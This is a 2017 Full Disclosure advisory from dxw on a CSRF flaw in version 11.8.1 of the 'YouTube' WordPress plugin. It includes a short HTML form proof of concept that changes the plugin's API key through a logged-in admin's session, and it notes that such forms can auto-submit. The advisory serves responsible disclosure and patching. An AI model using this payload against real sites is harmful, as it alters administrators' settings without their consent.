
Date: Tue, 25 Jul 2017 12:17:38 +0000
From: dxw Security <security@....com>
To: fulldisclosure@...lists.org
Subject: [FD] CSRF in YouTube (WordPress plugin) could allow unauthenticated
	attacker to change any setting within the plugin (WordPress plugin)

Details
================
Software: YouTube
Version: 11.8.1
Homepage: https://wordpress.org/plugins/youtube-embed-plus/
Advisory report: https://security.dxw.com/advisories/csrf-in-youtube-plugin/
CVE: Awaiting assignment
CVSS: 4.3 (Medium; AV:N/AC:M/Au:N/C:N/I:P/A:N)

Description
================
CSRF in YouTube (WordPress plugin) could allow unauthenticated attacker to change any setting within the plugin

Vulnerability
================
The plugin contains a CSRF vulnerability which allows an attacker to change any setting in the plugin so long as they can cause a logged-in admin user to follow a link.
The impact of the CSRF vulnerability appears to be limited because it seems that the plugin is not vulnerable to XSS or anything else which could be used in conjunction with the CSRF vulnerability.

Proof of concept
================
Visit a page with the following content, and click submit:
<form method=\"POST\" action=\"http://localhost/wp-admin/admin.php?page=youtube-my-preferences\">
  <input type=\"text\" name=\"ytprefs_submitted\" value=\"Y\">
  <input type=\"text\" name=\"apikey\" value=\"HELLO\">
  <input type=\"submit\">
</form>
The “YouTube API Key:” value will be set to “HELLO”.
In a real attack, forms can be auto-submitted.

Mitigations
================
Upgrade to version 11.8.2 or later.

Disclosure policy
================
dxw believes in responsible disclosure. Your attention is drawn to our disclosure policy: https://security.dxw.com/disclosure/

Please contact us on security@....com to acknowledge this report if you received it via a third party (for example, plugins@...dpress.org) as they generally cannot communicate with us on your behalf.

This vulnerability will be published if we do not receive a response to this report with 14 days.

Timeline
================

2017-06-12: Discovered
2017-07-18: Reported to ext@...edplus.com
2017-07-18: First response from vendor, promises a new version
2017-07-19: New version released (changelog says “Make settings form more secure”)
2017-07-25: Advisory published



Discovered by dxw:
================
Tom Adams
Please visit security.dxw.com for more information.
          


_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/